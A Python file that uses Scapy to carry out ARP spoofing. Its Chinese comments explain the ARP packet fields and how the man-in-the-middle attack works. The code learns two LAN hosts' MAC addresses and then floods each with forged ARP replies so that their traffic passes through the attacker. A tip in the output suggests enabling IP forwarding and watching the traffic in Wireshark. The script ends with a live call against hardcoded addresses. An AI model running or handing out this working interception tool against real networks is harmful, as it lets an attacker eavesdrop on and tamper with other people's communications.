from scapy.all import *
import time

'''
ARP协议各字段意义：
     hwsrc     :发送方源MAC/响应方源MAC
     psrc      :发送方源IP/响应方源IP
     hwdst     :发送方目的MAC/响应方目的MAC（ARP请求时填广播地址00:00:00:00:00:00，响应时填写发送方MAC）
     pdst      :发送方目的IP/响应方目的IP

请求：
###[ ARP ]### 
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = None
     plen      = None
     op        = who-has
     hwsrc     = 0c:54:15:43:cb:5a
     psrc      = 10.0.0.10
     hwdst     = 00:00:00:00:00:00
     pdst      = 10.0.0.3
响应：
 ###[ ARP ]### 
	 hwtype    = 0x1
	 ptype     = IPv4
	 hwlen     = 6
	 plen      = 4
	 op        = is-at
	 hwsrc     = 1c:1b:0d:0a:66:80
	 psrc      = 10.0.0.3
	 hwdst     = 0c:54:15:43:cb:5a
	 pdst      = 10.0.0.10

理论：
	ARP欺骗是一种中间人攻击，设被攻击的两方为A和B，攻击者为hacker，三者在同一个局域网下。
	又设hacker已知A和B的IP地址。
	攻击过程如下：
		1.hacker通过ARP请求获取到A和B的MAC地址
		2.hacker通过ARP响应（虽然A和B都没有向hacker发送ARP请求）告诉A：我是B（我的IP地址是B的IP地址），我的MAC地址是xxx（hacker的MAC地址）
														告诉B：我是A（我的IP地址是A的IP地址），我的MAC地址是xxx（hacker的MAC地址）
		3.A和B收到ARP响应后就会更新自己的ARP缓存，之后A和B之间的所有以太网流量都会流经hacker
'''


def arp_spoof(target1, target2, MAC):
    # 备份，用于之后的恢复，分别对应于target1和target2
    originmac1 = ''
    originmac2 = ''
    # sr()加上p在二层发送
    # 先向两边发送ARP请求，获取初始硬件地址，用于之后的恢复
    response, unanswered = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=[target1, target2]), verbose=False)
    originmac1 = response[0][1][ARP].hwsrc
    originmac2 = response[1][1][ARP].hwsrc

    # 开始欺骗
    print('[*] Arpspoofing {} and {}'.format(target1, target2))
    print('[!] TIPS: Enable IP forwarding and use Wireshark to analyze communication :)')
    while True:
        try:
            send(ARP(hwsrc=MAC, psrc=target2,
                     hwdst=originmac1, pdst=target1, op=2), verbose=False)
            send(ARP(hwsrc=MAC, psrc=target1,
                     hwdst=originmac2, pdst=target2, op=2), verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            # 开始恢复网络到欺骗前的状态
            print('[*] Restoring ARP... ', end='')
            send(ARP(hwsrc=originmac2, psrc=target2,
                     hwdst=originmac1, pdst=target1, op=2), verbose=False, count=5)
            send(ARP(hwsrc=originmac1, psrc=target1,
                     hwdst=originmac2, pdst=target2, op=2), verbose=False, count=5)
            print('Completed')
            break


arp_spoof('10.0.0.1', '10.0.0.3', '0C:54:15:43:CB:5A')
